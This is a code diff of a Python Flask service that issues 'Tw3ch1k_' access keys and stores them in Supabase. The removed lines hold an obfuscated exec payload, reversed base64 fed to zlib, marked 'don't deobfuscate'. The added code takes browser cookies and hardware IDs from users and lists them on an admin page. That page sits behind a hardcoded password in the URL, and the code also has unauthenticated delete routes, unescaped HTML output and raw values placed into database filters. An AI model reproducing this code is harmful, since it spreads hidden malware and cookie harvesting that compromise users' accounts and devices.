@@ -1,3 +1,235 @@
+import os
+import random
+import base64
+import requests
+from dotenv import load_dotenv
+from datetime import datetime, timedelta, timezone
+from flask import Flask, request, jsonify, send_from_directory
 
-# [ ! ] Obfuscation, don't deobfucate!           
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
+load_dotenv("/etc/secrets/.env")
+app = Flask(__name__)
+
+SUPABASE_URL = os.getenv('SUPABASE_URL')
+SUPABASE_KEY = os.getenv('SUPABASE_KEY')
+SUPABASE_HEADERS = {
+    'apikey': SUPABASE_KEY,
+    'Authorization': f'Bearer {SUPABASE_KEY}',
+    'Content-Type': 'application/json'
+}
+
+
+def generate_key(length=16):
+    CUSTOM_LETTERS = 'oasuxclO'
+    CUSTOM_DIGITS = '68901'
+
+    digits_count = int(length * 0.7)
+    letters_count = length - digits_count
+
+    digits = random.choices(CUSTOM_DIGITS, k=digits_count)
+    letters = random.choices(CUSTOM_LETTERS, k=letters_count)
+
+    key_chars = digits + letters
+    random.shuffle(key_chars)
+    key = ''.join(key_chars)
+    ddp = '-'.join([key[i:i+4] for i in range(0, len(key), 4)])
+    return f"Tw3ch1k_{ddp}"
+
+
+@app.route('/api/get_key')
+def get_key():
+    key = generate_key()
+    created_at = datetime.utcnow().isoformat()
+    data = {"key": key, "created_at": created_at, "used": False}
+    res = requests.post(f"{SUPABASE_URL}/rest/v1/keys", headers=SUPABASE_HEADERS, json=data)
+    return jsonify({"key": key}) if res.status_code == 201 else jsonify({"error": "Failed to save key"}), 500
+
+@app.route("/api/verify_key", methods=["GET"])
+def verify_key():
+    user_key = request.args.get("key")
+    if not user_key:
+        return jsonify({"error": "missing key"}), 400
+
+    headers = {
+        "apikey": SUPABASE_KEY,
+        "Authorization": f"Bearer {SUPABASE_KEY}",
+    }
+
+    params = {
+        "select": "*",
+        "key": f"eq.{user_key}"
+    }
+
+    response = requests.get(f"{SUPABASE_URL}/rest/v1/keys", headers=headers, params=params)
+
+    if response.status_code != 200:
+        return jsonify({"error": "database error"}), 500
+
+    data = response.json()
+    if not data:
+        return jsonify({"status": "not_found"})
+
+    key_data = data[0]
+
+    try:
+        # Убедимся, что created_at — это offset-aware datetime
+        created_at_raw = key_data["created_at"].replace("Z", "+00:00")
+        created_at = datetime.fromisoformat(created_at_raw)
+        if created_at.tzinfo is None:
+            created_at = created_at.replace(tzinfo=timezone.utc)
+    except Exception as e:
+        return jsonify({"error": f"invalid created_at format: {e}"}), 500
+
+    now_utc = datetime.now(timezone.utc)
+
+    if now_utc - created_at > timedelta(hours=24):
+        return jsonify({"status": "expired"})
+
+    if key_data.get("used") is True:
+        return jsonify({"status": "used"})
+
+    return jsonify({"status": "valid"})
+
+@app.route('/api/save_user', methods=['POST'])
+def save_user():
+    data = request.json
+    ip = request.remote_addr or 'unknown_ip'
+    cookies = data.get('cookies', '')
+    hwid = data.get('hwid', '')
+    key = data.get('key', '')
+
+    user_id = hwid or base64.b64encode(ip.encode()).decode()
+
+    # 1. Проверяем, есть ли пользователь
+    user_res = requests.get(f"{SUPABASE_URL}/rest/v1/users?user_id=eq.{user_id}", headers=SUPABASE_HEADERS)
+    if user_res.status_code != 200:
+        return jsonify({"error": "Failed to query user", "details": user_res.text}), 500
+
+    users = user_res.json()
+    if users:
+        # Пользователь есть — возвращаем данные
+        user = users[0]
+        return jsonify({
+            "status": "exists",
+            "key": user["key"],
+            "registered_at": user["registered_at"]
+        })
+
+    # 2. Пользователя нет — проверяем ключ из запроса
+    if key:
+        key_res = requests.get(f"{SUPABASE_URL}/rest/v1/keys?key=eq.{key}", headers=SUPABASE_HEADERS)
+        if key_res.status_code != 200:
+            return jsonify({"error": "Failed to query key", "details": key_res.text}), 500
+        if not key_res.json():
+            # Ключ из запроса не валиден, сгенерируем новый
+            key = generate_key()
+            created_at = datetime.utcnow().isoformat()
+            key_data = {"key": key, "created_at": created_at, "used": False}
+            key_save_res = requests.post(f"{SUPABASE_URL}/rest/v1/keys", headers=SUPABASE_HEADERS, json=key_data)
+            if key_save_res.status_code != 201:
+                return jsonify({"error": "Failed to save key", "details": key_save_res.text}), 500
+    else:
+        # Ключ не передан — генерируем новый
+        key = generate_key()
+        created_at = datetime.utcnow().isoformat()
+        key_data = {"key": key, "created_at": created_at, "used": False}
+        key_save_res = requests.post(f"{SUPABASE_URL}/rest/v1/keys", headers=SUPABASE_HEADERS, json=key_data)
+        if key_save_res.status_code != 201:
+            return jsonify({"error": "Failed to save key", "details": key_save_res.text}), 500
+
+    # 3. Сохраняем пользователя
+    registered_at = datetime.utcnow().isoformat()
+    user_data = {
+        "user_id": user_id,
+        "cookies": cookies,
+        "hwid": hwid,
+        "key": key,
+        "registered_at": registered_at
+    }
+    user_save_res = requests.post(f"{SUPABASE_URL}/rest/v1/users", headers=SUPABASE_HEADERS, json=user_data)
+    if user_save_res.status_code == 201:
+        return jsonify({
+            "status": "saved",
+            "key": key,
+            "registered_at": registered_at
+        })
+    else:
+        return jsonify({"error": "Failed to save user", "details": user_save_res.text}), 500
+
+@app.route('/')
+def serve_index():
+    return send_from_directory('.', 'index.html')
+
+
+@app.route('/style.css')
+def serve_css():
+    return send_from_directory('.', 'style.css')
+
+
+@app.route('/user/admin')
+def admin_panel():
+    access_key = request.args.get('d')
+    if access_key != '22042013':
+        return "Access denied", 403
+
+    keys_res = requests.get(f"{SUPABASE_URL}/rest/v1/keys", headers=SUPABASE_HEADERS)
+    users_res = requests.get(f"{SUPABASE_URL}/rest/v1/users", headers=SUPABASE_HEADERS)
+
+    if keys_res.status_code != 200 or users_res.status_code != 200:
+        return "Failed to load data", 500
+
+    keys = keys_res.json()
+    users = users_res.json()
+
+    html = """
+    <html><head><title>Admin Panel</title>
+    <style>
+        body { font-family: monospace; background: #121212; color: #eee; padding: 20px; }
+        table { border-collapse: collapse; width: 100%; margin-bottom: 20px; }
+        th, td { border: 1px solid #666; padding: 8px; }
+        th { background: #222; }
+        button { background: #f33; color: white; border: none; padding: 4px 8px; cursor: pointer; }
+    </style>
+    <script>
+        async function deleteKey(key) {
+            const res = await fetch('/api/delete_key?key=' + encodeURIComponent(key));
+            alert(await res.text());
+            location.reload();
+        }
+        async function deleteUser(id) {
+            const res = await fetch('/api/delete_user?user_id=' + encodeURIComponent(id));
+            alert(await res.text());
+            location.reload();
+        }
+    </script></head><body>
+    <h1>🔑 Keys</h1><table><tr><th>Key</th><th>Used</th><th>Created At</th><th>Action</th></tr>
+    """
+    for k in keys:
+        html += f"<tr><td>{k['key']}</td><td>{k['used']}</td><td>{k['created_at']}</td><td><button onclick=\"deleteKey('{k['key']}')\">Delete</button></td></tr>"
+    html += "</table><h1>👤 Users</h1><table><tr><th>User ID</th><th>HWID</th><th>Cookies</th><th>Key</th><th>Registered At</th><th>Action</th></tr>"
+    for u in users:
+        html += f"<tr><td>{u['user_id']}</td><td>{u['hwid']}</td><td>{u['cookies']}</td><td>{u['key']}</td><td>{u['registered_at']}</td><td><button onclick=\"deleteUser('{u['user_id']}')\">Delete</button></td></tr>"
+    html += "</table></body></html>"
+    return html
+
+
+@app.route('/api/delete_key')
+def delete_key():
+    key = request.args.get('key')
+    if not key:
+        return "Missing key", 400
+    res = requests.delete(f"{SUPABASE_URL}/rest/v1/keys?key=eq.{key}", headers=SUPABASE_HEADERS)
+    return "Key deleted" if res.status_code == 204 else f"Failed to delete: {res.text}", 500
+
+
+@app.route('/api/delete_user')
+def delete_user():
+    user_id = request.args.get('user_id')
+    if not user_id:
+        return "Missing user_id", 400
+    res = requests.delete(f"{SUPABASE_URL}/rest/v1/users?user_id=eq.{user_id}", headers=SUPABASE_HEADERS)
+    return "User deleted" if res.status_code == 204 else f"Failed to delete: {res.text}", 500
+
+
+if __name__ == '__main__':
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
